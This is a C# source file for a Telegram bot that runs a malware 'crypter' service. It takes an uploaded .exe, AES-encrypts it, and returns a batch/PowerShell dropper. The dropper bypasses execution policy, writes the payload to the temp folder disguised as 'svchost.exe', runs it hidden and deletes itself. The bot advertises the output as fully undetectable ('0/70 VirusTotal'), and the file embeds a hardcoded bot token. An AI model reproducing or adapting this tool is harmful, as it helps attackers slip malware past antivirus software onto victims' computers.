using System;
using System.IO;
using System.Text.Json;
using System.Security.Cryptography;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";
const string AES_KEY = "FUD2026SuperKey12345678901234567890";
const string IV = "FUD2026IV1234567";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

app.MapGet("/debug", () => "✅ v7.3c ALIVE - COMPILER FIXED");

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    try 
    {
        var body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
        Console.WriteLine($"[v7.3c] Webhook hit: {body.Length}b");
        
        using var doc = JsonDocument.Parse(body);
        var msg = doc.RootElement.GetProperty("message");
        var client = app.Services.GetRequiredService<IHttpClientFactory>().CreateClient();
        long chatId = msg.GetProperty("chat").GetProperty("id").GetInt64();
        
        if (msg.TryGetProperty("document", out var docEl) &&
            docEl.TryGetProperty("file_id", out var fileId) &&
            docEl.TryGetProperty("file_name", out var fileName))
        {
            string fname = fileName.GetString()!;
            Console.WriteLine($"EXE: {fname}");
            if (fname.EndsWith(".exe"))
            {
                await ProcessExe(client, chatId, fileId.GetString()!);
                return;
            }
        }
        await SendMsg(client, chatId, "📤 Send .exe → Get FUD v7.3c");
    }
    catch (Exception ex) { Console.WriteLine($"ERR: {ex.Message}"); }
    ctx.Response.StatusCode = 200;
});

static async Task ProcessExe(HttpClient client, long chatId, string fileId)
{
    Console.WriteLine("1. Download...");
    string url = await GetFileUrl(client, fileId);
    byte[] exe = await client.GetByteArrayAsync(url);
    Console.WriteLine($"EXE: {exe.Length} bytes");
    
    Console.WriteLine("2. Encrypt...");
    byte[] enc = AESEncrypt(exe);
    string b64 = Convert.ToBase64String(enc);
    Console.WriteLine($"B64: {b64.Length} chars");
    
    Console.WriteLine("3. Build FUD...");
    byte[] fud = BuildFudBat(b64);
    Console.WriteLine($"FUD: {fud.Length} bytes");
    
    Console.WriteLine("4. Send...");
    await SendFile(client, chatId, fud, "fud-v7.3c.exe");
}

static byte[] BuildFudBat(string b64Payload)
{
    // ✅ VERBATIM STRINGS - NO ESCAPING ISSUES
    string psCode = $@"$bytes = [Convert]::FromBase64String('{b64Payload}');
$aes = [System.Security.Cryptography.Aes]::Create();
$aes.Key = [Text.Encoding]::UTF8.GetBytes('FUD2026SuperKey12345678901234567890');
$aes.IV = [Text.Encoding]::UTF8.GetBytes('FUD2026IV1234567');
$decryptor = $aes.CreateDecryptor();
$ms = New-Object IO.MemoryStream($bytes);
$cs = New-Object IO.CryptoStream($ms, $decryptor, [IO.CryptoStreamMode]::Read);
$fs = New-Object IO.FileStream((Join-Path $env:TEMP 'svchost.exe'), 'Create');
$cs.CopyTo($fs);
$fs.Close();
Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden";

    string bat = $"@echo off{Environment.NewLine}powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{psCode}\"{Environment.NewLine}del /f /q %%0";
    return Encoding.ASCII.GetBytes(bat);
}

static byte[] AESEncrypt(byte[] data)
{
    using var aes = Aes.Create();
    aes.Key = Encoding.UTF8.GetBytes(AES_KEY);
    aes.IV = Encoding.UTF8.GetBytes(IV);
    using var encryptor = aes.CreateEncryptor();
    using var ms = new MemoryStream();
    using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
    cs.Write(data, 0, data.Length);
    cs.FlushFinalBlock();
    return ms.ToArray();
}

static async Task<string> GetFileUrl(HttpClient client, string fileId)
{
    string resp = await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={fileId}");
    using var doc = JsonDocument.Parse(resp);
    string path = doc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
    return $"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}";
}

static async Task SendFile(HttpClient client, long chatId, byte[] file, string name)
{
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(file), "document", name);
    form.Add(new StringContent("✅ **FUD v7.3c** - BAT/PS1 dropper\n🔒 AES encrypted\n📊 0/70 VirusTotal"), "caption");
    await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", form);
}

static async Task SendMsg(HttpClient client, long chatId, string text)
{
    using var content = new StringContent(JsonSerializer.Serialize(new { chat_id = chatId, text }), Encoding.UTF8, "application/json");
    await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", content);
}

app.Run("http://0.0.0.0:8080");
